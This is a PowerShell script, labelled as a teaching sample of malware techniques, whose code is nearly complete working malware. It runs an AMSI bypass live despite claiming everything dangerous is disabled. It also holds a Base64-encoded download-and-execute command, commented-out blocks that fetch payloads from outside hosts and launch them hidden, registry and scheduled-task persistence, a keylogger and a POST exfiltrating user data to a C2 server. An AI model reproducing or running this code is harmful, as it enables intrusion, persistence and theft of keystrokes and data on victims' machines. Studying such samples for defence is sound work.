$a = 'Write'
$b = 'Host'
$c = $a + '-' + $b

$a = 'Ne'
$b = 'tWe'
$c = $b + $a
$d = 'bDoWn'
$e = 'lOaD'
$f = $c + $d + $e

$encodedCommand = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAuAHAAcwAnACkA"

$cmd = 'In' + 'v' + 'o' + 'k' + 'e'
$cmd += 'E' + 'x' + 'p' + 'r' + 'e' + 's' + 's' + 'i' + 'o' + 'n'

$Ref = [Ref].Assembly.GetType('Sys' + 'tem.M' + 'anag' + 'ement.Aut' + 'omation.Am' + 'siUt' + 'ils')
$Ref = $Ref.GetField('am' + 'siIni' + 'tFa' + 'iled', 'Non' + 'Public,Static')
$Ref.SetValue($null, $true)

$urls = @(
    'http://192.168.1.100/stage1.ps1',
    'http://192.168.1.101/beacon.exe',
    'http://malicious-domain.ru/payload.dll'
)

$paths = @(
    "$env:TEMP\svchost_update.ps1",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe",
    "$env:LOCALAPPDATA\Temp\cache.dat"
)

<#
for ($i = 0; $i -lt $urls.Count; $i++) {
    try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $wc.DownloadFile($urls[$i], $paths[$i])

        if ($paths[$i] -like '*.ps1') {
            powershell.exe -ExecutionPolicy Bypass -File $paths[$i]
        } else {
            Start-Process -FilePath $paths[$i] -WindowStyle Hidden
        }
        break
    } catch {
        Write-Error "Échec téléchargement: $($urls[$i])"
        continue
    }
}
#>

$registryPaths = @(
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
)

$payloadPath = "$env:APPDATA\Microsoft\Windows\update_service.exe"

<#
foreach ($regPath in $registryPaths) {
    try {
        Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value $payloadPath -ErrorAction SilentlyContinue
        Write-Host "[+] Persistance ajoutée: $regPath"
    } catch {
        Write-Host "[-] Échec persistance: $regPath (permissions insuffisantes)"
    }
}
#>

$taskName = "WindowsUpdateTask"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\update.ps1`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

<#
try {
    Register-ScheduledTask -TaskName $taskName `
        -Action $taskAction `
        -Trigger $taskTrigger `
        -Principal $taskPrincipal `
        -Force `
        -ErrorAction SilentlyContinue
    Write-Host "[+] Tâche planifiée créée: $taskName"
} catch {
    Write-Host "[-] Échec création tâche: $($_.Exception.Message)"
}
#>

function Get-SystemInfo {
    $info = @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        UserDomain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        RAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
        IPAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*" | Select-Object -First 1).IPAddress
        ProcessCount = (Get-Process).Count
        Antiavirus = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct).displayName
    }
    return $info
}

<#
$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keyStates);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(int vKey, int scanCode, byte[] keyState, StringBuilder buff, int buffSize, uint flags);
"@

$KeyLogger = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace API -PassThru

# while ($true) {
#     Start-Sleep -Milliseconds 40
#     for ($i = 1; $i -le 254; $i++) {
#         $keyCode = $KeyLogger::GetAsyncKeyState($i)
#         if ($keyCode -eq -32767) {
#             $key = [ConsoleKey]$i
#             Add-Content -Path "$env:TEMP\.keylog.txt" -Value $key -Force -Hidden
#         }
#     }
# }
#>

$exfilData = @{
    username = $env:USERNAME
    computer = $env:COMPUTERNAME
    domain = $env:USERDOMAIN
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

<#
try {
    $json = $exfilData | ConvertTo-Json
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('Content-Type', 'application/json')
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0')
    $response = $wc.UploadString('http://192.168.1.100:8080/beacon', 'POST', $json)
    Write-Host "[+] Données exfiltrées avec succès"
} catch {
    Write-Host "[-] Échec exfiltration: $($_.Exception.Message)"
}
#>

function Test-Sandbox {
    $sandboxIndicators = @(
        'VMware', 'VirtualBox', 'QEMU', 'Xen', 'Bochs', 'Parallels'
    )

    $biosManufacturer = (Get-WmiObject Win32_BIOS).Manufacturer
    $computerSystem = (Get-WmiObject Win32_ComputerSystem).Manufacturer

    foreach ($indicator in $sandboxIndicators) {
        if ($biosManufacturer -like "*$indicator*" -or $computerSystem -like "*$indicator*") {
            Write-Host "[!] Environnement virtuel détecté: $indicator"
            return $true
        }
    }

    $processCount = (Get-Process).Count
    if ($processCount -lt 30) {
        Write-Host "[!] Nombre de processus suspect: $processCount (sandbox probable)"
        return $true
    }

    return $false
}

Write-Host "=== Script d'analyse PowerShell ===" -ForegroundColor Cyan
Write-Host "Ce script est un exemple pédagogique de techniques malware." -ForegroundColor Yellow
Write-Host "Toutes les fonctions dangereuses sont DÉSACTIVÉES." -ForegroundColor Yellow
Write-Host ""

$isSandbox = Test-Sandbox
if ($isSandbox) {
    Write-Host "[!] Sandbox détecté - Dans un vrai malware, le script s'arrêterait ici." -ForegroundColor Red
}

Write-Host "`n=== Informations système collectées ===" -ForegroundColor Green
$systemInfo = Get-SystemInfo
$systemInfo | Format-Table -AutoSize

Write-Host "`n=== Techniques malware présentes dans ce script ===" -ForegroundColor Green
$techniques = @(
    "1. Obfuscation par variables et concatenation",
    "2. Encodage Base64 de commandes",
    "3. AMSI bypass (Cobalt Strike)",
    "4. Download + Execute depuis URLs multiples",
    "5. Persistance Registry (Run/RunOnce)",
    "6. Persistance Task Scheduler",
    "7. Collection d'informations système",
    "8. Keylogger (API user32.dll)",
    "9. Exfiltration vers serveur C2",
    "10. Détection sandbox/VM"
)

$techniques | ForEach-Object { Write-Host "  [x] $_" }

Write-Host "`n=== Analyse terminée ===" -ForegroundColor Cyan
Write-Host "Pour aller plus loin: soumettez ce script à une IA pour analyse détaillée." -ForegroundColor Gray
